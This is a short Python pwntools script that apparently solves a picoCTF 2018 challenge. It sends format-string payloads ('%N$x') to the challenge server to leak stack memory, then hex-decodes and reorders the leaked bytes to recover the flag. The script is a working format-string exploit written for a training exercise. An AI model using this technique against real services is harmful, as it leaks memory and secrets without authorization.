#!/usr/bin/env python

import pwn
import codecs

host, port = "2018shell3.picoctf.com", 34802


def main():

    text = ""
    s = pwn.remote(host, port)

    s.recv()
    s.recv()
    command = ["%" + str(i) + "$x" for i in range(27, 32)]
    s.sendline(''.join(command))

    # s.interactive()
    # prompt = s.recv().strip()
    text += codecs.decode(s.recv().strip(), "hex").decode("utf-8")
    print(text)
    # print([codecs.decode(i, 'hex') for i in prompt.split("0x") if len(i) % 2 == 0 and len(i) >= 2])
    
    # prompt = s.recv().decode("utf-8")[2:-9]
    # print([codecs.decode(i, 'hex') for i in prompt.split("0x") if len(i) % 2 == 0 and len(i) >= 2])

    s.close()

    s = pwn.remote(host, port)

    s.recv()
    s.recv()
    command = ["%" + str(i) + "$x" for i in range(32, 38)]
    s.sendline(''.join(command))

    # s.interactive()
    # prompt = s.recv().strip()
    text += codecs.decode(s.recv().strip(), "hex").decode("utf-8")
    print(text)

    s.close()

    s = pwn.remote(host, port)

    s.recv()
    s.recv()
    command = "%38$x"
    s.sendline(command)

    text += codecs.decode(s.recv().strip()[1:], "hex").decode("utf-8")
    sub = list(map(lambda x: x[::-1], [text[i:i+4] for i in range(0, len(text), 4)]))
    print(''.join(sub))
    


if __name__ == "__main__":
    a = main()